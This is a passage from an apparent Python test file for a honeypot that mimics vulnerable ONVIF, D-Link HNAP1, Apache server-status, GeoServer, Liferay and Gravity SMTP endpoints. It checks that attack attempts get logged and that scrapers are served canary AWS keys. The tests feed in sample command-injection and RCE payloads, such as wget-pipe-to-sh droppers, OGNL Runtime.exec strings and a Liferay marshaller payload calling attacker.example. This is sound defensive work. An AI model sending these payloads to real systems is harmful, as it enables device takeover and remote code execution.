    assert tbenv._onvif_soap_action_from_body("<random/>") == ""


def test_onvif_has_cmdi_indicators():
    assert tbenv._onvif_has_cmdi("<UpgradeUrl>http://x;wget http://y/z</UpgradeUrl>")
    assert tbenv._onvif_has_cmdi("$(id)")
    assert tbenv._onvif_has_cmdi("`whoami`")
    assert tbenv._onvif_has_cmdi("<FirmwareUpgrade/>")
    # GetDeviceInformation banner-grab body is not flagged.
    assert not tbenv._onvif_has_cmdi("<s:Body><tds:GetDeviceInformation/></s:Body>")
    assert not tbenv._onvif_has_cmdi("")


async def test_dispatch_onvif_device_service_returns_soap_envelope(flux_client):
    resp = await flux_client.get(
        "/onvif/device_service",
        headers={"X-Forwarded-For": "203.0.113.95"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "GetDeviceInformationResponse" in text
    assert tbenv.ONVIF_MANUFACTURER in text
    assert tbenv.ONVIF_MODEL in text
    assert tbenv.ONVIF_FIRMWARE_VERSION in text
    assert resp.headers.get("Content-Type", "").startswith("application/soap+xml")
    assert resp.headers.get("Server", "").startswith("lighttpd/")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "onvif-device-service"
    assert entry["onvifPath"] == "/onvif/device_service"
    assert entry["onvifMethod"] == "GET"
    assert entry["onvifHasCmdInjection"] is False
    assert entry["onvifSoapActionBody"] == ""


async def test_dispatch_onvif_logs_soap_action_and_cmdi_on_post(flux_client):
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
        b' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">\n'
        b'<s:Body><tds:FirmwareUpgrade>'
        b'<tds:UpgradeUrl>http://attacker/x;wget http://x/y</tds:UpgradeUrl>'
        b'</tds:FirmwareUpgrade></s:Body></s:Envelope>'
    )
    resp = await flux_client.post(
        "/onvif/device_service",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.96",
            "Content-Type": "application/soap+xml",
            "SOAPAction": '"http://www.onvif.org/ver10/device/wsdl/FirmwareUpgrade"',
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "onvif-device-service"
    assert entry["onvifMethod"] == "POST"
    assert entry["onvifSoapActionBody"] == "FirmwareUpgrade"
    assert "FirmwareUpgrade" in entry["onvifSoapActionHeader"]
    assert entry["onvifHasCmdInjection"] is True
    assert "bodyPreview" in entry


async def test_dispatch_onvif_bare_device_service_path(flux_client):
    # Stripped banner-grab dictionaries probe /device_service with no
    # /onvif/ prefix; same handler should respond.
    resp = await flux_client.get(
        "/device_service",
        headers={"X-Forwarded-For": "203.0.113.98"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "onvif-device-service"
    assert entry["onvifPath"] == "/device_service"


async def test_dispatch_onvif_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "ONVIF_ENABLED", False)
    resp = await flux_client.get(
        "/onvif/device_service",
        headers={"X-Forwarded-For": "203.0.113.97"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- HNAP1 router trap (CVE-2015-2051 bait) ---


def test_hnap1_enabled_by_default():
    assert tbenv.HNAP1_ENABLED


def test_hnap1_default_paths_match_observed_probes():
    for path in (
        "/HNAP1",
        "/hnap1",
        "/HNAP1/",
        "/Hnap1/",
    ):
        assert tbenv.is_hnap1_path(path), f"expected match: {path}"


def test_hnap1_path_non_match():
    for path in (
        "/",
        "/hnap",
        "/HNAP",
        "/HNAP1/foo",  # action paths under /HNAP1/<x> are not in default set
        "/.env",
    ):
        assert not tbenv.is_hnap1_path(path), f"unexpected match: {path}"


def test_hnap1_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "HNAP1_ENABLED", False)
    assert not tbenv.is_hnap1_path("/HNAP1")


def test_hnap1_has_cmdi_indicators():
    # CVE-2015-2051: shell-meta in the SOAPAction value.
    assert tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/`wget http://x/y;sh`"', "", "",
    )
    assert tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/$(id)"', "", "",
    )
    assert tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/Login;reboot"', "", "",
    )
    # Mirai-style dropper bodies.
    assert tbenv._hnap1_has_cmdi("", "", "wget http://x/y -O - | sh")
    assert tbenv._hnap1_has_cmdi("", "", "tftp -g -r evil.bin 192.168.1.5")
    # Plain GET banner-grab is not flagged.
    assert not tbenv._hnap1_has_cmdi("", "", "")
    assert not tbenv._hnap1_has_cmdi(
        '"http://purenetworks.com/HNAP1/GetDeviceSettings"', "", "",
    )


async def test_dispatch_hnap1_get_returns_devicesettings_envelope(flux_client):
    resp = await flux_client.get(
        "/HNAP1",
        headers={"X-Forwarded-For": "203.0.113.131"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<soap:Envelope" in text
    assert "<DeviceSettings" in text
    assert tbenv.HNAP1_VENDOR in text
    assert tbenv.HNAP1_MODEL in text
    assert tbenv.HNAP1_FIRMWARE_VERSION in text
    # Mathopd is a fingerprint a lot of Mirai-style scanners gate on.
    assert resp.headers.get("Server", "").startswith("Mathopd/")
    assert resp.headers.get("Content-Type", "").startswith("text/xml")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hnap1-discovery"
    assert entry["hnap1Path"] == "/HNAP1"
    assert entry["hnap1Method"] == "GET"
    assert entry["hnap1HasCmdInjection"] is False


async def test_dispatch_hnap1_post_uses_action_name_in_response(flux_client):
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
        b'<soap:Body><Login xmlns="http://purenetworks.com/HNAP1/">'
        b'<Action>request</Action><Username>admin</Username></Login>'
        b'</soap:Body></soap:Envelope>\n'
    )
    resp = await flux_client.post(
        "/HNAP1",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.132",
            "Content-Type": "text/xml",
            "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<LoginResponse" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hnap1-soap-action"
    assert entry["hnap1Method"] == "POST"
    assert entry["hnap1HasCmdInjection"] is False
    assert entry["hnap1SoapAction"].startswith('"http://purenetworks.com/HNAP1/Login')
    assert "bodyPreview" in entry


async def test_dispatch_hnap1_flags_cmd_injection_in_soapaction_header(flux_client):
    # CVE-2015-2051: shell payload concatenated into the SOAPAction value.
    resp = await flux_client.post(
        "/HNAP1",
        data=b"<soap:Envelope/>",
        headers={
            "X-Forwarded-For": "203.0.113.133",
            "Content-Type": "text/xml",
            "SOAPAction": (
                '"http://purenetworks.com/HNAP1/'
                '`wget http://1.2.3.4/x.sh -O- | sh`"'
            ),
        },
    )
    assert resp.status == 200

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "hnap1-soap-action"
    assert entry["hnap1HasCmdInjection"] is True
    assert "wget" in entry["hnap1SoapAction"].lower()


async def test_dispatch_hnap1_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "HNAP1_ENABLED", False)
    resp = await flux_client.get(
        "/HNAP1",
        headers={"X-Forwarded-For": "203.0.113.134"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Apache mod_status (`/server-status`) trap ---


def test_server_status_enabled_by_default():
    assert tbenv.SERVER_STATUS_ENABLED


def test_server_status_default_paths_match_observed_probes():
    for path in (
        "/server-status",
        "/server-status/",
        "/SERVER-STATUS",
        "/server-status?auto",
        "/server-status?refresh=5",
    ):
        assert tbenv.is_server_status_path(path), f"expected match: {path}"


def test_server_status_path_non_match():
    for path in (
        "/",
        "/server",
        "/server-status-extra",
        "/api/server-status",
        "/.env",
    ):
        assert not tbenv.is_server_status_path(path), f"unexpected match: {path}"


def test_server_status_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "SERVER_STATUS_ENABLED", False)
    assert not tbenv.is_server_status_path("/server-status")


def test_server_status_parse_refresh():
    assert tbenv._server_status_parse_refresh("refresh=5") == 5
    assert tbenv._server_status_parse_refresh("refresh=60&foo=bar") == 60
    assert tbenv._server_status_parse_refresh("foo=1&refresh=10") == 10
    # bad values
    assert tbenv._server_status_parse_refresh("") is None
    assert tbenv._server_status_parse_refresh("auto") is None
    assert tbenv._server_status_parse_refresh("refresh=abc") is None
    assert tbenv._server_status_parse_refresh("refresh=0") is None
    assert tbenv._server_status_parse_refresh("refresh=99999") is None


def test_server_status_html_embeds_canary_in_recent_request_urls():
    body = tbenv._server_status_render_html(
        "victim.example", tbenv._aws(FAKE_TRACEBIT),
    ).decode("utf-8")
    # Apache version banner — version-gated scanners must see this.
    assert tbenv.SERVER_STATUS_APACHE_VERSION in body
    assert "Server MPM: event" in body
    # The canary access key is embedded in URL query strings in the
    # scoreboard's `Request` column where credential-scrapers grep.
    assert "AKIAFAKEEXAMPLE01" in body
    assert "aws_access_key_id=" in body
    assert "aws_secret_access_key=" in body
    # Scoreboard string carries the expected `W`/`_` shape so monitoring
    # parsers that gate on it don't bail.
    assert "<pre>WWWWWWW_______</pre>" in body


def test_server_status_auto_embeds_canary_and_mod_status_keys():
    body = tbenv._server_status_render_auto(
        tbenv._aws(FAKE_TRACEBIT),
    ).decode("utf-8")
    # Canonical mod_status `?auto` keys monitoring tools parse.
    for key in (
        "Total Accesses:",
        "Total kBytes:",
        "CPULoad:",
        "Uptime:",
        "ReqPerSec:",
        "BusyWorkers:",
        "IdleWorkers:",
        "Scoreboard:",
    ):
        assert key in body, f"missing mod_status auto key: {key}"
    # Canary key surfaces in the LastReq lines.
    assert "AKIAFAKEEXAMPLE01" in body


async def test_dispatch_server_status_html_returns_apache_banner(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/server-status",
        headers={"X-Forwarded-For": "203.0.113.151"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("text/html")
    # Apache version banner pins the Server header — scanners use it to
    # decide whether to ship a version-gated exploit.
    assert resp.headers.get("Server", "").startswith("Apache/2.4")
    text = await resp.text()
    assert "Apache Server Status" in text
    assert "AKIAFAKEEXAMPLE01" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "server-status-html"
    assert entry["serverStatusFormat"] == "html"
    assert "aws" in entry["canaryTypes"]


async def test_dispatch_server_status_auto_query_returns_text_format(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/server-status?auto",
        headers={"X-Forwarded-For": "203.0.113.152"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("text/plain")
    text = await resp.text()
    assert "Scoreboard:" in text
    assert "BusyWorkers:" in text
    assert "AKIAFAKEEXAMPLE01" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "server-status-auto"
    assert entry["serverStatusFormat"] == "auto"


async def test_dispatch_server_status_keyless_still_serves_banner(flux_client, monkeypatch):
    # Without TRACEBIT_API_KEY the canary slots go empty but the page
    # still 200s so banner-grab scanners get the Apache fingerprint.
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/server-status",
        headers={"X-Forwarded-For": "203.0.113.153"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Apache Server Status" in text
    # No canary value rendered, but the URL slot is still there.
    assert "aws_access_key_id=" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "server-status-html"
    assert entry["canaryTypes"] == []


async def test_dispatch_server_status_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "SERVER_STATUS_ENABLED", False)
    resp = await flux_client.get(
        "/server-status",
        headers={"X-Forwarded-For": "203.0.113.154"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- GeoServer trap (CVE-2024-36401 bait) ---


def test_geoserver_enabled_by_default():
    assert tbenv.GEOSERVER_ENABLED


def test_is_geoserver_path_match():
    for path in (
        "/geoserver",
        "/geoserver/",
        "/geoserver/web/",
        "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage",
        "/geoserver/index.html",
        "/geoserver/ows",
        "/geoserver/wfs",
        "/geoserver/rest/workspaces",
        "/GeoServer/Web/",  # case-insensitive
    ):
        assert tbenv.is_geoserver_path(path), f"expected match: {path}"


def test_is_geoserver_path_non_match():
    for path in [
        "/",
        "/.env",
        "/admin/",
        "/geo",
        "/geoserveradmin",  # no trailing slash, not /geoserver itself
        "/wp-admin/",
    ]:
        assert not tbenv.is_geoserver_path(path), f"unexpected match: {path}"


def test_is_geoserver_path_disabled(monkeypatch):
    monkeypatch.setattr(tbenv, "GEOSERVER_ENABLED", False)
    assert not tbenv.is_geoserver_path("/geoserver/web/")


def test_geoserver_has_ognl_detects_runtime():
    assert tbenv._geoserver_has_ognl(
        "service=wfs&exec(Runtime.getRuntime", ""
    )
    assert tbenv._geoserver_has_ognl(
        "", '<wfs:Query><Filter><PropertyName>exec(Runtime.getRuntime().exec("id"))</PropertyName></Filter></wfs:Query>'
    )
    assert tbenv._geoserver_has_ognl(
        "evaluateProperty=foo", ""
    )


def test_geoserver_has_ognl_clean_returns_false():
    assert not tbenv._geoserver_has_ognl("service=wfs&request=GetCapabilities", "")
    assert not tbenv._geoserver_has_ognl("", "<Query>boring</Query>")


def test_render_geoserver_landing_includes_login_and_version():
    body = tbenv.render_geoserver_landing("victim.example", "2.25.1").decode("utf-8")
    assert "GeoServer" in body
    assert "2.25.1" in body
    assert "/geoserver/j_spring_security_check" in body
    assert "AboutGeoServerPage" in body


def test_render_geoserver_about_includes_version():
    body = tbenv.render_geoserver_about("h", "2.25.1").decode("utf-8")
    assert "About GeoServer" in body
    assert "2.25.1" in body


def test_render_geoserver_capabilities_xml_root_matches_service():
    body = tbenv.render_geoserver_capabilities("wms", "2.25.1").decode("utf-8")
    assert "<WMS_Capabilities" in body
    assert "</WMS_Capabilities>" in body


async def test_dispatch_geoserver_root_redirects(flux_client):
    resp = await flux_client.get(
        "/geoserver/",
        headers={"X-Forwarded-For": "203.0.113.61", "Host": "victim.example"},
        allow_redirects=False,
    )
    assert resp.status == 302
    assert resp.headers["Location"] == "/geoserver/web/"
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-redirect-root"
    assert entry["geoserverPath"] == "/geoserver/"


async def test_dispatch_geoserver_web_landing(flux_client):
    resp = await flux_client.get(
        "/geoserver/web/",
        headers={"X-Forwarded-For": "203.0.113.62", "Host": "victim.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "GeoServer" in text
    assert "Login" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-web-landing"
    assert entry["geoserverHasOgnl"] is False


async def test_dispatch_geoserver_about_page_logs_ognl_payload(flux_client):
    # AboutGeoServerPage is the CVE-2024-36401 trigger surface; an OGNL-bearing
    # query must flip geoserverHasOgnl and capture the payload preview.
    resp = await flux_client.get(
        "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage"
        "?evaluateProperty=exec(Runtime.getRuntime().exec(%22id%22))",
        headers={"X-Forwarded-For": "203.0.113.63"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "About GeoServer" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-about-page"
    assert entry["geoserverHasOgnl"] is True
    assert "geoserverPayloadPreview" in entry


async def test_dispatch_geoserver_ows_capabilities(flux_client):
    resp = await flux_client.get(
        "/geoserver/ows?service=wfs&version=2.0.0&request=GetCapabilities",
        headers={"X-Forwarded-For": "203.0.113.64"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<WFS_Capabilities" in text
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "geoserver-ogc-wfs"


async def test_dispatch_geoserver_rest_returns_401(flux_client):
    resp = await flux_client.get(
        "/geoserver/rest/workspaces",
        headers={"X-Forwarded-For": "203.0.113.65"},
    )
    assert resp.status == 401
    assert resp.headers.get("WWW-Authenticate", "").startswith("Basic ")
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "geoserver-rest-401"


async def test_dispatch_geoserver_post_body_logs_ognl(flux_client):
    body = (
        b'<wfs:GetPropertyValue xmlns:wfs="http://www.opengis.net/wfs/2.0">'
        b'<valueReference>exec(Runtime.getRuntime().exec(\'id\'))</valueReference>'
        b'</wfs:GetPropertyValue>'
    )
    resp = await flux_client.post(
        "/geoserver/wfs",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.66",
            "Content-Type": "application/xml",
        },
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "geoserver-ogc-wfs"
    assert entry["geoserverHasOgnl"] is True


async def test_dispatch_geoserver_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "GEOSERVER_ENABLED", False)
    resp = await flux_client.get(
        "/geoserver/web/", headers={"X-Forwarded-For": "203.0.113.67"}
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Liferay JSON-WS trap (CVE-2020-7961 marshaller RCE bait) ---


def test_liferay_enabled_by_default():
    assert tbenv.LIFERAY_ENABLED


def test_liferay_path_matches_landing_and_invoke():
    must_match = [
        "/api/jsonws",
        "/api/jsonws/",
        "/api/jsonws/invoke",
        "/api/jsonws?serviceClassName=com.liferay.portal.service.UserService",
        "/API/JSONWS",
        "/api/jsonws/anything-else",
    ]
    for path in must_match:
        assert tbenv.is_liferay_path(path), f"expected match: {path}"


def test_liferay_path_does_not_match_unrelated_paths():
    for path in [
        "/",
        "/api",
        "/api/",
        "/api/v4/user",
        "/api/jsonwsX",      # no slash boundary, must not match
        "/api/.env",
        "/jsonws",
    ]:
        assert not tbenv.is_liferay_path(path), f"unexpected match: {path}"


def test_liferay_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "LIFERAY_ENABLED", False)
    assert not tbenv.is_liferay_path("/api/jsonws")


def test_liferay_marshaller_indicators_detect_cve_2020_7961_payload():
    payload = (
        b'[{"className":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",'
        b'"settings":{"userOverridesAsString":"HexAsciiSerializedMap:'
        b'aced...ldap://attacker.example/Exploit"}}]'
    )
    assert tbenv._liferay_has_marshaller(payload) is True


def test_liferay_marshaller_indicators_ignore_benign_invocation():
    payload = b'[{"/user/get-user-by-email-address":{"emailAddress":"test@example.com"}}]'
    assert tbenv._liferay_has_marshaller(payload) is False


def test_liferay_marshaller_indicators_empty_body_is_false():
    assert tbenv._liferay_has_marshaller(b"") is False


def test_liferay_landing_embeds_canary_in_s3_config_block():
    body = tbenv.render_liferay_jsonws_landing(
        "victim.example", tbenv._aws(FAKE_TRACEBIT), "7.2.0 GA1", "7200",
    ).decode("utf-8")
    # Version banner pins the build so version-gated scanners proceed.
    assert "Liferay" in body
    assert "7.2.0 GA1" in body
    # Canary key + secret in the S3-backed DLAppService description —
    # the scanner-grep slot.
    assert "AKIAFAKEEXAMPLE01" in body
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    # Service catalog links scanners use to walk method signatures.
    assert "DLAppService" in body
    assert "/api/jsonws?serviceClassName=" in body


def test_liferay_service_signature_embeds_canary_in_default_arg_slot():
    body = tbenv.render_liferay_jsonws_service_signature(
        "com.liferay.document.library.kernel.service.DLAppService",
        tbenv._aws(FAKE_TRACEBIT),
        "7.2.0 GA1",
        "7200",
    ).decode("utf-8")
    catalog = json.loads(body)
    assert catalog["context"] == "Liferay-Portal"
    assert catalog["serviceClassName"].endswith("DLAppService")
    s3 = catalog["methods"][0]["default"]
    assert s3["accessKey"] == "AKIAFAKEEXAMPLE01"
    assert s3["secretKey"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


async def test_dispatch_liferay_landing_returns_liferay_banner(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/api/jsonws", headers={"X-Forwarded-For": "203.0.113.91"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("text/html")
    assert "Liferay" in resp.headers.get("Liferay-Portal", "")
    text = await resp.text()
    assert "AKIAFAKEEXAMPLE01" in text
    assert "JSON Web Services API" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "liferay-jsonws-landing"
    assert entry["liferayHasMarshallerPayload"] is False
    assert "aws" in entry["canaryTypes"]


async def test_dispatch_liferay_service_signature_returns_json_catalog(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/api/jsonws?serviceClassName=com.liferay.document.library.kernel.service.DLAppService",
        headers={"X-Forwarded-For": "203.0.113.92"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("application/json")
    catalog = json.loads(await resp.text())
    assert catalog["serviceClassName"].endswith("DLAppService")
    assert catalog["methods"][0]["default"]["accessKey"] == "AKIAFAKEEXAMPLE01"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "liferay-jsonws-service-signature"
    assert entry["liferayServiceClassName"].endswith("DLAppService")


async def test_dispatch_liferay_invoke_captures_marshaller_payload(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    # Canonical CVE-2020-7961 marshaller payload shape.
    payload = (
        b'[{"className":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",'
        b'"settings":{"userOverridesAsString":"HexAsciiSerializedMap:'
        b'aced...ldap://attacker.example/Exploit"}}]'
    )
    resp = await flux_client.post(
        "/api/jsonws/invoke",
        data=payload,
        headers={
            "X-Forwarded-For": "203.0.113.93",
            "Content-Type": "application/json",
        },
    )
    assert resp.status == 500
    text = await resp.text()
    assert "JSONWebServiceInvocationException" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "liferay-jsonws-invoke"
    assert entry["liferayHasMarshallerPayload"] is True
    # Payload preview is captured for triage but the full body still
    # hashed via bodySha256 in the standard log row.
    assert "ldap://" in entry["liferayPayloadPreview"]


async def test_dispatch_liferay_keyless_still_serves_landing(flux_client, monkeypatch):
    # Without TRACEBIT_API_KEY the canary slots go empty but the page
    # still 200s so banner-grab scanners keep walking.
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/api/jsonws", headers={"X-Forwarded-For": "203.0.113.94"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Liferay" in text
    # No canary value rendered; the slot is still there for fingerprint.
    assert "DLAppService" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "liferay-jsonws-landing"
    assert entry["canaryTypes"] == []


async def test_dispatch_liferay_unknown_subpath_returns_liferay_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(
        "/api/jsonws/com.liferay.UnknownService/find-by-id",
        headers={"X-Forwarded-For": "203.0.113.95"},
    )
    assert resp.status == 404
    text = await resp.text()
    assert "JSONWebServiceInvocationException" in text
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "liferay-jsonws-miss"


async def test_dispatch_liferay_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "LIFERAY_ENABLED", False)
    resp = await flux_client.get(
        "/api/jsonws", headers={"X-Forwarded-For": "203.0.113.96"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Gravity SMTP plugin (WordPress REST) trap ---


def test_gravity_smtp_enabled_by_default():
    assert tbenv.GRAVITY_SMTP_ENABLED


def test_gravity_smtp_path_matches_observed_endpoints():
    must_match = [
        "/wp-json/gravitysmtp/v1",
        "/wp-json/gravitysmtp/v1/",
        "/wp-json/gravitysmtp/v1/settings",
        "/wp-json/gravitysmtp/v1/config",
        "/wp-json/gravitysmtp/v1/tests/mock-data",
        "/wp-json/gravitysmtp/v1/tests/mock-data?page=gravitysmtp-settings",
        "/wp-json/gravitysmtp/v1/connector/gmail",
        "/wp-json/gravitysmtp/v1/connector/amazonses",
        "/wp-json/gravitysmtp/v1/data/debug",
        # Mixed case (WP-REST is case-insensitive on the namespace
        # segment) and trailing-segment variant.
        "/WP-JSON/gravitysmtp/v1/settings",
    ]
    for path in must_match:
        assert tbenv.is_gravity_smtp_path(path), f"expected match: {path}"


def test_gravity_smtp_path_does_not_match_unrelated_paths():
    for path in [
        "/",
        "/wp-json",
        "/wp-json/",
        "/wp-json/wp/v2/users",
        "/wp-json/gravityforms/v2/forms",       # the other Gravity plugin
        "/wp-json/gravitysmtpX/v1/settings",    # no slash boundary
        "/wp-json/gravitysmtp",                 # missing v1 segment
        "/.env",
    ]:
        assert not tbenv.is_gravity_smtp_path(path), f"unexpected match: {path}"


def test_gravity_smtp_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "GRAVITY_SMTP_ENABLED", False)
    assert not tbenv.is_gravity_smtp_path("/wp-json/gravitysmtp/v1/config")


def test_gravity_smtp_path_matches_wp_subdir_installs():
    """WordPress is commonly installed at `/blog/`, `/wordpress/`,
    `/wp/`, `/site/`, `/news/`, `/cms/`, `/press/` rather than at the
    webroot. Scanners enumerate both shapes; the predicate must
    catch them so the trailing-component dispatch fires identically."""
    for prefix in ("blog", "wordpress", "wp", "site", "news", "cms", "press"):
        for tail in (
            "/wp-json/gravitysmtp/v1",
            "/wp-json/gravitysmtp/v1/",
            "/wp-json/gravitysmtp/v1/settings",
            "/wp-json/gravitysmtp/v1/config",
            "/wp-json/gravitysmtp/v1/tests/mock-data",
            "/wp-json/gravitysmtp/v1/connector/amazonses",
        ):
            path = f"/{prefix}{tail}"
            assert tbenv.is_gravity_smtp_path(path), f"expected match: {path}"


def test_gravity_smtp_strip_subdir_preserves_unprefixed_paths():
    base = "/wp-json/gravitysmtp/v1/config"
    assert tbenv._gravity_smtp_strip_subdir(base) == base
    assert tbenv._gravity_smtp_strip_subdir("/blog" + base) == base
    assert tbenv._gravity_smtp_strip_subdir("/wordpress" + base) == base
    # Sub-dir prefix that isn't a known WP install (`/api/wp-json/...`)
    # does NOT get stripped; that path shouldn't match.
    other = "/api/wp-json/gravitysmtp/v1/config"
    assert tbenv._gravity_smtp_strip_subdir(other) == other


def test_gravity_smtp_subdir_does_not_match_unrelated_prefixes():
    """Make sure the sub-dir normaliser is scoped — `/random/wp-json/`
    must NOT match (only the known WP install dirs)."""
    for path in [
        "/api/wp-json/gravitysmtp/v1/config",
        "/admin/wp-json/gravitysmtp/v1/config",
        "/blogx/wp-json/gravitysmtp/v1/config",  # no slash boundary
    ]:
        assert not tbenv.is_gravity_smtp_path(path), f"unexpected match: {path}"


async def test_dispatch_gravity_smtp_subdir_install_routes_to_handler(flux_client, monkeypatch):
    """`/blog/wp-json/gravitysmtp/v1/config` (WordPress under `/blog/`)
    should land on the same dispatch as the bare path and embed the
    AWS canary."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/blog/wp-json/gravitysmtp/v1/config",
        headers={"X-Forwarded-For": "203.0.113.150", "Host": "victim.example"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload["amazonses"]["aws_access_key_id"] == "AKIAFAKEEXAMPLE01"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-config"
    # Raw path is logged verbatim so triage can see the sub-dir placement.
    assert entry["gravitysmtpPath"] == "/blog/wp-json/gravitysmtp/v1/config"


def test_gravity_smtp_config_embeds_aws_canary_and_per_hit_synthetics():
    body = tbenv.render_gravity_smtp_config(FAKE_TRACEBIT, "victim.example").decode("utf-8")
    payload = json.loads(body)
    # AWS SES carries the Tracebit canary in the credential-grep slot.
    assert payload["amazonses"]["aws_access_key_id"] == "AKIAFAKEEXAMPLE01"
    assert payload["amazonses"]["aws_secret_access_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["amazonses"]["enabled"] is True
    # Per-hit synthetics on the other connectors carry the right shape.
    assert payload["mailgun"]["api_key"].startswith("key-")
    assert len(payload["mailgun"]["api_key"]) == len("key-") + 32  # 16 hex bytes → 32 chars
    assert payload["sendgrid"]["api_key"].startswith("SG.")
    assert payload["sendgrid"]["api_key"].count(".") == 2
    assert len(payload["sparkpost"]["api_key"]) == 40
    assert payload["gmail"]["access_token"].startswith("ya29.")
    assert payload["gmail"]["client_secret"].startswith("GOCSPX-")
    assert payload["smtp"]["host"] == "smtp.victim.example"


def test_gravity_smtp_config_synthetics_rotate_per_hit():
    """Two calls in the same process must produce different values for
